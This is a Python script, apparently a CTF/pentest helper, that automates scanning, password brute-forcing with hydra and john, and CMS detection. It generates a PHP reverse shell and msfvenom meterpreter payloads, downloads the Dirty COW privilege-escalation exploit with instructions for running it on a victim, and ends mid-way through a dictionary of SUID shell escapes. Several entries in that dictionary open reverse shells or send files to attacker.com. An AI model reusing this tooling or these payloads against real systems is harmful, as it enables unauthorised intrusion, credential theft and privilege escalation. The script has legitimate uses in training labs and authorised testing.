#!/usr/bin/env python3
import os
import random
import time
import sys
import requests
from termcolor import colored
import base64
import subprocess


#getting required data
try:
	ip = str(sys.argv[1])
	box = str(sys.argv[2])
	platform = str(sys.argv[3])
except :
	color = 'red'
	print(colored("Usage:./tool.py <ip of the box> <name of the box> <platform>",color,attrs=["bold"]))
	sys.exit(1)


#checking if directory exists

if not os.path.isdir("~/ctf/"+platform+"/"+box):
	#make the directory
	os.system("mkdir ~/ctf/"+platform+"/"+box)

#detecting user 
os.system("whoami | tee user.txt")
with open('user.txt','r') as f:
	for line in f.readlines():
		user = line.strip('\n')
f.close()
os.system("rm user.txt")

if user == "root":
	username = "/root/"
else:
	username = '/home/'+user+'/'

#directory to save things
dire = username + 'ctf/'+platform+"/"+box+"/"

#exploit directory

exploit_dir = username + "exploit/"

#making useful directories
os.system("mkdir "+dire+"nmap_scans")
nmap_dir = dire + "nmap_scans/"

os.system("mkdir "+dire+"enum")
enum_dir = dire + "enum/"

os.system("mkdir "+dire+"reverse_shells")
rev_dir = dire + "reverse_shells/"

os.system("mkdir "+dire+"exploit_binaries")
exploited_code = dire + "exploit_binaries/"

# to get password file
def get_password():
    file = str(input("[*]Enter password file(Full path)[Press Enter use the default]: "))
    if len(file) == 0:
        file = '/usr/share/wordlists/rockyou.txt'
    return file
#to get wordlist
def get_wordlist():
    file = str(input("[*]Enter wordlist[Press Enter to use the default wordlist]: "))
    if len(file) == 0:
        file = "/usr/share/wordlists/dirb/common.txt"
    return file

#function to print color message
def colored_print(message):
    colors = ['red','green','blue','yellow','magenta','cyan']
    color = random.choice(colors)
    print(colored(message,color,attrs=["bold"]))

#show status
def status(directory,file):
    text = "[*]Results Saved to: " + directory + file
    colored_print(text)
    print("[+]Done")

#clear screen
def clear():
    os.system("clear")



#cewl to create custom wordlist
def Cewl():
    clear()
    colored_print('[*]Starting Cewl to create custom wordlist')
    url = str(input("Enter the full url of the page: "))
    #ewl -w customwordlist.txt -d 5 -m 7 www.sans.org
    file = 'customwordlist.txt'
    os.system("cewl -w " + dire + file + " -d 5 -m 7 " + url)
    status(dire,file)

#Generate php reverse shell
def rev_shell():
    clear()
    print("[*]Generating PHP reverse shell")
    tun = str(input("[*]Enter your tunnel adress: "))
    port = str(input("[*]Enter port: "))
    file = 'php-reverse_shell.php'
    url = "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
    #curl url > exploit.php
    os.system("curl " + url + " > exploit.php")
    in_file = "exploit.php"
    fin = open(in_file,'rt')
    fout = open("out.php",'wt')
    for line in fin:
        fout.write(line.replace('127.0.0.1',tun))
    fin.close()
    fout.close()
    ein = open("out.php",'rt')
    eout = open(file,'wt')
    for line in ein:
        eout.write(line.replace('1234',port))
    ein.close()
    eout.close()
    #moving the file
    os.system("mv " + file+" " + rev_dir+file)
    #deleting file
    os.system("rm out.php && rm exploit.php")
    status(rev_dir,file)
#Dirty cow Exploit
def dirty_cow():
    clear()
    colored_print("[*]Using Dirtycow Exploit")
    colored_print("[*]Vurnarable Linux kernel:2.6.22 < 3.9")
    colored_print("[*]'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) ")
    print("[*]Getting the exploit")
    os.system("wget https://www.exploit-db.com/download/40839")
    file = 'dirty.c'
    os.system("mv 40839 " +exploited_code+file)
    status(exploited_code,file)
    colored_print("[*]Download it in victime machine")
    colored_print("[*]Usage:gcc -pthread dirty.c -o dirty -lcrypt && ./dirty")
    colored_print("[*]Then su firefart")
    colored_print("[*]Neccessary: mv /tmp/passwd.bak /etc/passwd")

    time.sleep(10)

#Edit the host file
def edit_host():
    clear()
    colored_print("[*]Editing the host file")
    os.system("chmod +x host.sh;./host.sh")
    colored_print("[*]Host Added")

#nikto scan
def nikto():
    clear()
    colored_print("[*]Nikto Scan")
    #port = str(input("[*]Enter port[Press enter for 80]: "))
    file = 'nikto_log.txt'
    url = str(input("[*]Enter Url to scan: "))
    #nikto -h url | tee log.txt
    os.system("nikto -h " + url + " | tee " + enum_dir + file)
    status(enum_dir,file)

#Enum4linux
def enum():
    clear()
    colored_print("[*]Starting Enum4linux")
    file = "enum_log.txt"
    #enum4linux -a ip | tee log.txt
    os.system("enum4linux -a " + ip + " | tee " + enum_dir + file)
    status(enum_dir,file)

#decode basic rot

def decode_rot():
    clear()
    colored_print("[*]DECODE BASIC ROT")
    file = "rot_crack.txt"
    message = str(input("Enter message: "))
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = "abcdefghijklmnopqrstuvwxyz"
    with open(file,'w') as f:
        for key in range(len(upper)):
            translated = ''
            for symbol in message:
                if symbol in upper:
                    num = upper.find(symbol)
                    num = num - key
                    if num < 0 :
                        num = num + len(upper)
                    translated = translated + upper[num]
                elif symbol in lower:
                    num = lower.find(symbol)
                    num = num - key
                    if num < 0 :
                        num = num + len(lower)
                    translated = translated + lower[num]
                else:
                    translated = translated + symbol
            colored_print("[*]Key " + str(key) + ": " + str(translated))
            f.write("[*]Key " + str(key) + ": " + str(translated)+ "\n")
    f.close()
    # Moving the file
    #mv file dire
    os.system("mv " + file + " " + dire)
    status(dire,file)

# steg cracker
def stegcrack():
    clear()
    colored_print("[*]Starting Steg crack")
    file = "steg_log.txt"
    t = get_password() # to get the password
    input_file = str(input("[*]Enter file name with full path: "))
    os.system("stegcracker " + input_file+" "+t+" | tee " + dire+file)
    status(dire,file)

#decode base64
def decode_base():
    clear()
    colored_print("[*]Decode base")
    file = "base_decode.txt"
    base64_message = str(input("[*]Enetr message: "))
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    print(colored(str(message),'blue',attrs=['bold']))
    with open(file,'w') as f:
        f.write(str(message))
    #moving file
    os.system("mv " + file + " "+dire)
    status(dire,file)

#use exif tool to an image
def exif():
    clear()
    colored_print("[*]Starting exiftool")
    file = "metadata.txt"
    #exiftool a.jpg
    input_file = str(input("[*]Enter full image path: "))
    os.system("exiftool " + input_file + " | tee " +dire+file)
    status(dire,file)


#brute zip file

def brute_zip():
    clear()
    colored_print("[*]Bruteforcing ZIP File")
    file = "brute_zip.txt"
    in_file = str(input("[*]Enter Zip file with full path: "))
    t = get_password() # to get password
    #zip2john file.zip > crackme.txt
    #john -w=rockyou.txt crackme.txt | tee log.txt
    os.system("zip2john " + in_file + " > crackme.txt")
    os.system("john --wordlist=" + t + " crackme.txt| tee " + dire + file )
    status(dire,file)

#cracking ssh password
def crack_ssh():
    clear()
    colored_print("[*]Cracking ssh password[Username available]")
    file = "ssh_crack.txt"
    t =get_password() # to get the password file
    username = str(input("[*]Enter username: "))
    port = str(input("[*]Enter port[Press Enter to use the default]: "))
    if len(port) == 0:
        #hydra -l user -P password.txt ssh://ip | tee log.txt
        os.system("hydra -l " + username + " -P " + t + " ssh://" + ip + " | tee " + dire+file)
    else:
        os.system("hydra -l " + username + " -P "+t+" -S " + port + " ssh://" + ip + " | tee "+dire+file)
    status(dire,file)

#cracking ftp password
def crack_ftp():
    clear()
    colored_print("[*]Cracking ftp password[Username available]")
    file = "ftp_crack.txt"
    t =get_password() # to get the password file
    username = str(input("[*]Enter username: "))
    port = str(input("[*]Enter port[Press Enter to use the default]: "))
    if len(port) == 0:
        #hydra -l user -P password.txt ftp://ip | tee log.txt
        os.system("hydra -l " + username + " -P " + t + " ftp://" + ip + " | tee " + dire+file)
    else:
        os.system("hydra -l " + username + " -P "+t+" -S " + port + " ftp://" + ip + " | tee "+dire+file)
    status(dire,file)


#ssh key cracking
def key_crack():
    clear()
    colored_print("[*]Starting SSH key crack")
    file = "id_rsa"
    file2 = 'crackme.txt'
    file3 = 'john_sshkey_log.txt'
    colored_print("[*]Note: Store the encrypted ssh key in " + dire + file)
    full_file_path = dire + file
    full_file2_path = dire + file2
    if not os.path.exists(full_file_path):
        colored_print("[*]Save the file properly")
        sys.exit(1)
    password = get_password()
    #ssh2jhon.py id_rsa > crackme.txt
    os.system("python /usr/share/john/ssh2john.py " + full_file_path + " > " + full_file2_path)
    #john --wordlist=rockyou.txt crackme.txt | tee log.txt
    os.system("john --wordlist=" + password + " " + full_file2_path + " | tee " + dire + file3)
    status(dire,file3)

#Wordpress scanning
def wordpress_scan():
    clear()
    colored_print("[*]Starting WordPress Scan")
    #url = str(input("[*]Enter the url to scan: "))
    
    #wpscan --url http://$ip -o wordpress_scan.txt
    file = 'wordpress_scan.txt'
    os.system("chmod +x wordpress_scan.sh;./wordpress_scan.sh")
    time.sleep(10)
    #moving the file
    os.system('mv '+file+" "+enum_dir)
    status(enum_dir,file)


#Wordpress bruteforce

def wordpress_brute():
    clear()
    colored_print("[*]Starting wordpress Bruteforce")
    #url = str(input("[*]Enter the bruteforce site: "))
    #username = str(input("Enter Username: "))
    #password = get_password()
    #wpscan –url http://example.com –passwords rockyou.txt –usernames andy
    file = 'wp_brute.txt'
    #os.system("wpscan --url " + url + " --passwords " + password + " --usernames " + username + " | tee " + dire + file)
    os.system('chmod +x wp_brute.sh;./wp_brute.sh')
    time.sleep(11)
    #moving the file
    os.system('mv '+file+" " + dire)
    status(dire,file)


#dnsrecon


def dns_recon():
	clear()
	colored_print("[*]Starting DNS Recon")
	os.system("chmod +x dnsrecon.py&&./dnsrecon.py")
	#moving the file
	os.system("mv "+ip+"_zonetransfer.txt " + enum_dir)
	file = ip+"_zonetransfer.txt"
	status(enum_dir,file)


#nmap udp port scan
def udp_scan():
    clear()
    colored_print("[*]Starting UDP Port scan")
    #nmap -sU $ip | tee udp.txt
    file = "udp_port.txt"
    os.system("sudo nmap -sU " + ip + " | tee " + nmap_dir + file)
    status(nmap_dir,file)


#nmpa basic scan

def basic_scan():
	clear()
	colored_print("[*]Starting nmap basic scan")
	file = "basic_scan.nmap"
	os.system("nmap -sC -sV -oN " + nmap_dir+"basic_scan " + ip)
	status(nmap_dir,file)

def meterpreter():
    clear()
    colored_print("[*]Generating a meterpreter rev shell")
    tun = str(input("[*]Enter your tunnel adress: "))
    port = str(input("[*]Enter port for reverse connection "))
    colored_print("Press 1 to use Windows Staged reverse TCP")
    colored_print("Press 2 to use Windows Stageless reverse TCP")
    colored_print("Press 3 to use Linux Staged reverse TCP")
    colored_print("press 4 to use Linux Stageless reverse TCP")
    colored_print("[*]Enter your choise: ")
    x = int(input())
    if x == 1:
        payload = 'windows/meterpreter/reverse_tcp'
    elif x == 2:
        payload = 'windows/shell_reverse_tcp'
    elif x == 3:
        payload = 'linux/x86/meterpreter/reverse_tcp'
    else:
        payload = 'linux/x86/shell_reverse_tcp'

    forma = str(input("[*]Enter payload output format[exe/sh/elf]: "))
    outputfile = str(input("[*]Enter output file name[with out extension]: "))
    os.system("msfvenom -p " + payload + " LHOST=" + tun + " LPORT=" + port + " -f " + forma + " > " + exploited_code + outputfile + "." + forma)
    full_file_path = exploited_code + "meta_"+payload+".rc"
    #os.system("touch " + full_file_path)
    with open("meta"+payload+".rc",'w') as f:
        f.write("use exploit/multi/handler\n")
        f.write("set PAYLOAD " + payload + "\n")
        f.write("set LHOST " + tun+"\n")
        f.write("set LPORT " + port + "\n")
        f.write("exploit\n")
    f.close()
    os.system("mv meta"+payload+".rc " + exploited_code)
    colored_print("[*]Exploit Created:" + exploited_code+outputfile+'.'+forma)
    colored_print("[*]Config file created:"+full_file_path)
    colored_print("[*]To start listner type:msfconsole -r " + full_file_path)
    time.sleep(10)

#windows exploit suggester
def windows():
    clear()
    colored_print("[*]Windows Exploit Suggester")
    colored_print('[*]Upgrading the script')
    full_file_path = exploit_dir + 'wesng/wes.py'
    os.system("python3 " + full_file_path + " --update")
    colored_print("[*]Copy all the data of the command 'systeminfo' in " + dire + "win.txt")
    option = str(input("[*]Done[Y/N]: "))
    if option == 'Y':

    	colored_print('[*]Starting Windows Exploit Suggester')
    	os.system("python3 " + full_file_path + " " + dire+"win.txt")


#Local Linux Exploit Suggesteor
def local_linux():
    clear()
    colored_print("[*]Opening Local Linux Exploit Suggester(Kernal Version Based)")
    file = 'linux_exploit_suggester.pl'
    
    Kernel = str(input("[*]Enter victim's kernal version(uname -r/hostnamectl): "))
    command  = "perl "+ exploit_dir + file + " -k " + Kernel
    os.system(command)
    colored_print("[*]Dirty Cow exploit is here inbuilt")
    time.sleep(180)


#cms scanner
def get(websiteToScan):
    global user_agent
    user_agent = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
    }
    return requests.get(websiteToScan, allow_redirects=False, headers=user_agent)

def cms_cheker():
    clear()
    colored_print("[*]Starting CMS Cheker")
    websiteToScan = str(input('Site to scan: '))

    # Check the input for HTTP or HTTPS and then remove it, if nothing is found assume HTTP
    if websiteToScan.startswith('http://'):
        proto = 'http://'
        # websiteToScan = websiteToScan.strip('http://')
        websiteToScan = websiteToScan[7:]
    elif websiteToScan.startswith('https://'):
        proto = 'https://'
        # websiteToScan = websiteToScan.strip('https://')
        websiteToScan = websiteToScan[8:]
    else:
        proto = 'http://'

    # Check the input for an ending / and remove it if found
    if websiteToScan.endswith('/'):
        websiteToScan = websiteToScan.strip('/')

    # Combine the protocol and site
    websiteToScan = proto + websiteToScan

    # Check to see if the site is online
    colored_print ("[+] Checking to see if the site is online...")

    try:
        onlineCheck = get(websiteToScan)
    except requests.exceptions.ConnectionError as ex:
        colored_print ("[!] " + websiteToScan + " appears to be offline.")
    else:
        if onlineCheck.status_code == 200 or onlineCheck.status_code == 301 or onlineCheck.status_code == 302:
            colored_print (" |  " + websiteToScan + " appears to be online.")
            colored_print ("Beginning scan...")
            colored_print ("[+] Checking to see if the site is redirecting...")
            redirectCheck = requests.get(websiteToScan, headers=user_agent)
            if len(redirectCheck.history) > 0:
                if '301' in str(redirectCheck.history[0]) or '302' in str(redirectCheck.history[0]):
                    colored_print ("[!] The site entered appears to be redirecting, please verify the destination site to ensure accurate results!")
                    colored_print ("[!] It appears the site is redirecting to " + redirectCheck.url)
            elif 'meta http-equiv="REFRESH"' in redirectCheck.text:
                colored_print ("[!] The site entered appears to be redirecting, please verify the destination site to ensure accurate results!")
            else:
                colored_print (" | Site does not appear to be redirecting...")
        else:
            colored_print ("[!] " + websiteToScan + " appears to be online but returned a " + str(
                onlineCheck.status_code) + " error.")
            sys.exit(1)

        
        colored_print ("[+] Attempting to get the HTTP headers...")
        # Pretty print the headers - courtesy of Jimmy
        for header in onlineCheck.headers:
            try:
                colored_print (" | " + header + " : " + onlineCheck.headers[header])
            except Exception as ex:
                colored_print ("[!] Error: " + ex.message)

        ####################################################
        # WordPress Scans
        ####################################################

        
        colored_print ("[+] Running the WordPress scans...")

        # Use requests.get allowing redirects otherwise will always fail
        wpLoginCheck = requests.get(websiteToScan + '/wp-login.php', headers=user_agent)
        if wpLoginCheck.status_code == 200 and "user_login" in wpLoginCheck.text and "404" not in wpLoginCheck.text:
            colored_print ("[!] Detected: WordPress WP-Login page: " + websiteToScan + '/wp-login.php')
        else:
            colored_print (" |  Not Detected: WordPress WP-Login page: " + websiteToScan + '/wp-login.php')

        # Use requests.get allowing redirects otherwise will always fail
        wpAdminCheck = requests.get(websiteToScan + '/wp-admin', headers=user_agent)
        if wpAdminCheck.status_code == 200 and "user_login" in wpAdminCheck.text and "404" not in wpLoginCheck.text:
            colored_print ("[!] Detected: WordPress WP-Admin page: " + websiteToScan + '/wp-admin')
        else:
            colored_print (" |  Not Detected: WordPress WP-Admin page: " + websiteToScan + '/wp-admin')

        wpAdminUpgradeCheck = get(websiteToScan + '/wp-admin/upgrade.php')
        if wpAdminUpgradeCheck.status_code == 200 and "404" not in wpAdminUpgradeCheck.text:
            colored_print ("[!] Detected: WordPress WP-Admin/upgrade.php page: " + websiteToScan + '/wp-admin/upgrade.php')
        else:
            colored_print (" |  Not Detected: WordPress WP-Admin/upgrade.php page: " + websiteToScan + '/wp-admin/upgrade.php')

        wpAdminReadMeCheck = get(websiteToScan + '/readme.html')
        if wpAdminReadMeCheck.status_code == 200 and "404" not in wpAdminReadMeCheck.text:
            colored_print ("[!] Detected: WordPress Readme.html: " + websiteToScan + '/readme.html')
        else:
            colored_print (" |  Not Detected: WordPress Readme.html: " + websiteToScan + '/readme.html')

        wpLinksCheck = get(websiteToScan)
        if 'wp-' in wpLinksCheck.text:
            colored_print ("[!] Detected: WordPress wp- style links detected on index")
        else:
            colored_print (" |  Not Detected: WordPress wp- style links detected on index")

        ####################################################
        # Joomla Scans
        ####################################################

        
        print ("[+] Running the Joomla scans...")

        joomlaAdminCheck = get(websiteToScan + '/administrator/')
        if joomlaAdminCheck.status_code == 200 and "mod-login-username" in joomlaAdminCheck.text and "404" not in joomlaAdminCheck.text:
            colored_print ("[!] Detected: Potential Joomla administrator login page: " + websiteToScan + '/administrator/')
        else:
            colored_print (" |  Not Detected: Joomla administrator login page: " + websiteToScan + '/administrator/')

        joomlaReadMeCheck = get(websiteToScan + '/readme.txt')
        if joomlaReadMeCheck.status_code == 200 and "joomla" in joomlaReadMeCheck.text and "404" not in joomlaReadMeCheck.text:
            colored_print ("[!] Detected: Joomla Readme.txt: " + websiteToScan + '/readme.txt')
        else:
            colored_print (" |  Not Detected: Joomla Readme.txt: " + websiteToScan + '/readme.txt')

        joomlaTagCheck = get(websiteToScan)
        if joomlaTagCheck.status_code == 200 and 'name="generator" content="Joomla' in joomlaTagCheck.text and "404" not in joomlaTagCheck.text:
            colored_print ("[!] Detected: Generated by Joomla tag on index")
        else:
            colored_print (" |  Not Detected: Generated by Joomla tag on index")

        joomlaStringCheck = get(websiteToScan)
        if joomlaStringCheck.status_code == 200 and "joomla" in joomlaStringCheck.text and "404" not in joomlaStringCheck.text:
            colored_print ("[!] Detected: Joomla strings on index")
        else:
            colored_print (" |  Not Detected: Joomla strings on index")

        joomlaDirCheck = get(websiteToScan + '/media/com_joomlaupdate/')
        if joomlaDirCheck.status_code == 403 and "404" not in joomlaDirCheck.text:
            colored_print ("[!] Detected: Joomla media/com_joomlaupdate directories: " + websiteToScan + '/media/com_joomlaupdate/')
        else:
            colored_print (" |  Not Detected: Joomla media/com_joomlaupdate directories: " + websiteToScan + '/media/com_joomlaupdate/')

        ####################################################
        # Magento Scans
        ####################################################

        
        print ("[+] Running the Magento scans...")

        magentoAdminCheck = get(websiteToScan + '/index.php/admin/')
        if magentoAdminCheck.status_code == 200 and 'login' in magentoAdminCheck.text and "404" not in magentoAdminCheck.text:
            colored_print ("[!] Detected: Potential Magento administrator login page: " + websiteToScan + '/index.php/admin')
        else:
            colored_print (" |  Not Detected: Magento administrator login page: " + websiteToScan + '/index.php/admin')

        magentoRelNotesCheck = get(websiteToScan + '/RELEASE_NOTES.txt')
        if magentoRelNotesCheck.status_code == 200 and 'magento' in magentoRelNotesCheck.text:
            colored_print ("[!] Detected: Magento Release_Notes.txt: " + websiteToScan + '/RELEASE_NOTES.txt')
        else:
            colored_print (" |  Not Detected: Magento Release_Notes.txt: " + websiteToScan + '/RELEASE_NOTES.txt')

        magentoCookieCheck = get(websiteToScan + '/js/mage/cookies.js')
        if magentoCookieCheck.status_code == 200 and "404" not in magentoCookieCheck.text:
            colored_print ("[!] Detected: Magento cookies.js: " + websiteToScan + '/js/mage/cookies.js')
        else:
            colored_print (" |  Not Detected: Magento cookies.js: " + websiteToScan + '/js/mage/cookies.js')

        magStringCheck = get(websiteToScan + '/index.php')
        if magStringCheck.status_code == 200 and '/mage/' in magStringCheck.text or 'magento' in magStringCheck.text:
            colored_print ("[!] Detected: Magento strings on index")
        else:
            colored_print (" |  Not Detected: Magento strings on index")

            # print magStringCheck.text

        magentoStylesCSSCheck = get(websiteToScan + '/skin/frontend/default/default/css/styles.css')
        if magentoStylesCSSCheck.status_code == 200 and "404" not in magentoStylesCSSCheck.text:
            colored_print ("[!] Detected: Magento styles.css: " + websiteToScan + '/skin/frontend/default/default/css/styles.css')
        else:
            colored_print (" |  Not Detected: Magento styles.css: " + websiteToScan + '/skin/frontend/default/default/css/styles.css')

        mag404Check = get(websiteToScan + '/errors/design.xml')
        if mag404Check.status_code == 200 and "magento" in mag404Check.text:
            colored_print ("[!] Detected: Magento error page design.xml: " + websiteToScan + '/errors/design.xml')
        else:
            colored_print (" |  Not Detected: Magento error page design.xml: " + websiteToScan + '/errors/design.xml')

        ####################################################
        # Drupal Scans
        ####################################################

    
        colored_print ("[+] Running the Drupal scans...")

        drupalReadMeCheck = get(websiteToScan + '/readme.txt')
        if drupalReadMeCheck.status_code == 200 and 'drupal' in drupalReadMeCheck.text and '404' not in drupalReadMeCheck.text:
            colored_print ("[!] Detected: Drupal Readme.txt: " + websiteToScan + '/readme.txt')
        else:
            colored_print (" |  Not Detected: Drupal Readme.txt: " + websiteToScan + '/readme.txt')

        drupalTagCheck = get(websiteToScan)
        if drupalTagCheck.status_code == 200 and 'name="Generator" content="Drupal' in drupalTagCheck.text:
            colored_print ("[!] Detected: Generated by Drupal tag on index")
        else:
            colored_print (" |  Not Detected: Generated by Drupal tag on index")

        drupalCopyrightCheck = get(websiteToScan + '/core/COPYRIGHT.txt')
        if drupalCopyrightCheck.status_code == 200 and 'Drupal' in drupalCopyrightCheck.text and '404' not in drupalCopyrightCheck.text:
            colored_print ("[!] Detected: Drupal COPYRIGHT.txt: " + websiteToScan + '/core/COPYRIGHT.txt')
        else:
            colored_print (" |  Not Detected: Drupal COPYRIGHT.txt: " + websiteToScan + '/core/COPYRIGHT.txt')

        drupalReadme2Check = get(websiteToScan + '/modules/README.txt')
        if drupalReadme2Check.status_code == 200 and 'drupal' in drupalReadme2Check.text and '404' not in drupalReadme2Check.text:
            colored_print ("[!] Detected: Drupal modules/README.txt: " + websiteToScan + '/modules/README.txt')
        else:
            colored_print (" |  Not Detected: Drupal modules/README.txt: " + websiteToScan + '/modules/README.txt')

        drupalStringCheck = get(websiteToScan)
        if drupalStringCheck.status_code == 200 and 'drupal' in drupalStringCheck.text:
            colored_print ("[!] Detected: Drupal strings on index")
        else:
            colored_print (" |  Not Detected: Drupal strings on index")

        ####################################################
        # phpMyAdmin Scans
        ####################################################

        print
        print ("[+] Running the phpMyAdmin scans...")

        phpMyAdminCheck = get(websiteToScan)
        if phpMyAdminCheck.status_code == 200 and 'phpmyadmin' in phpMyAdminCheck.text:
            colored_print ("[!] Detected: phpMyAdmin index page")
        else:
            colored_print (" |  Not Detected: phpMyAdmin index page")

        pmaCheck = get(websiteToScan)
        if pmaCheck.status_code == 200 and 'pmahomme' in pmaCheck.text or 'pma_' in pmaCheck.text:
            colored_print ("[!] Detected: phpMyAdmin pmahomme and pma_ style links on index page")
        else:
            colored_print (" |  Not Detected: phpMyAdmin pmahomme and pma_ style links on index page")

        phpMyAdminConfigCheck = get(websiteToScan + '/config.inc.php')
        if phpMyAdminConfigCheck.status_code == 200 and '404' not in phpMyAdminConfigCheck.text:
            colored_print ("[!] Detected: phpMyAdmin configuration file: " + websiteToScan + '/config.inc.php')
        else:
            colored_print (" |  Not Detected: phpMyAdmin configuration file: " + websiteToScan + '/config.inc.php')
        
        colored_print ("Scan is now complete!")


#Intense Nmap Scan
def intense_scan():
    clear()
    #serv_dict = {}
    colored_print("[*]Starting Intense Scan")
    #nmap -T4 -A -v $ip | tee intense.txt
    file = "intense_scan.nmap"
    TCPSCAN = "nmap -vv -Pn -A -sC -sS -T 4 -p- -oN " + nmap_dir +"intense_scan"+" " + ip
    os.system(TCPSCAN)
    status(nmap_dir,file)


#http enum
def http_enum():
	clear()
	colored_print("[*]Starting http service enum")
	file = ip + "_http.nmap"
	port = str(input("[*]Enter port(Press enter to use default): "))
	if len(port) == 0:
		port = "80"
	HTTPSCAN = "nmap -sV -Pn -vv -p " + port+" --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN " + nmap_dir + file +" " + ip
	os.system(HTTPSCAN)
	status(nmap_dir,file)


#https scan
def https_enum():
	clear()
	colored_print("[*]Starting https service enum")
	file = ip + "_https.nmap"
	port=str(input("[*]Enter https service port: "))
	HTTPSCAN="nmap -sV -Pn -vv -p " + port +" --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN " + nmap_dir + file + " " + ip
	os.system(HTTPSCAN)
	status(nmap_dir,file)

#mssql scan

def mssqlEnum():
	clear()
	colored_print("[*]Starting mssql service enum")
	port = str(input("[*]Enter port: "))
	file = ip + "_mssql.nmap"
	MSSQLSCAN = "nmap -vv -sV -Pn -p " + port+" --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -oN " + nmap_dir+file+" " + ip
	os.system(MSSQLSCAN)
	status(nmap_dir,file)


#Things for Suid stuffs
#custom suid
customSUIDs = {
	'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
	'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
	'base32': 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode',
	'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
	'byebug': 'TF=$(mktemp)\necho \'system("/bin/sh")\' > $TF\n./byebug $TF\ncontinue',
	'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE',
	'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE',
	'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
	'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE',
	'date': 'LFILE=file_to_read\n./date -f $LFILE',
	'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
	'dialog': 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0',
	'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
	'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE',
	'ed': './ed\n!/bin/sh',
	'eqn': 'LFILE=file_to_read\n./eqn "$LFILE"',
	'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
	'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
	'gtester': 'TF=$(mktemp)\necho \'#!/bin/sh -p\' > $TF\necho \'exec /bin/sh -p 0<&1\' >> $TF\nchmod +x $TF\ngtester -q $TF',
	'hd': 'LFILE=file_to_read\n./hd "$LFILE"',
	'hexdump': 'LFILE=file_to_read\n./hexdump -C "$LFILE"',
	'highlight': 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"',
	'iconv': 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
	'iftop': './iftop\n!/bin/sh',
	'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
	'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
	'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
	'ksshell': 'LFILE=file_to_read\n./ksshell -i $LFILE',
	'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
	'look': 'LFILE=file_to_read\n./look \'\' "$LFILE"',
	'lwp-download': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE',
	'lwp-request': 'LFILE=file_to_read\n./lwp-request "file://$LFILE"',
	'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
	'mysql': "./mysql -e '\\! /bin/sh'", 'awk': './awk \'BEGIN {system("/bin/sh")}\'',
	'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0',
	'nawk': './nawk \'BEGIN {system("/bin/sh")}\'',
	'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT',
	'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
	'nohup': 'nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
	'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
	'pic': './pic -U\n.PS\nsh X sh X',
	'pico': './pico\n^R^X\nreset; sh 1>&0 2>&0',
	'pry': './pry\nsystem("/bin/sh")',
	'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE',
	'restic': 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
	'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
	'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
	'soelim': 'LFILE=file_to_read\n./soelim "$LFILE"',
	'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
	'strings': 'LFILE=file_to_read\n./strings "$LFILE"',
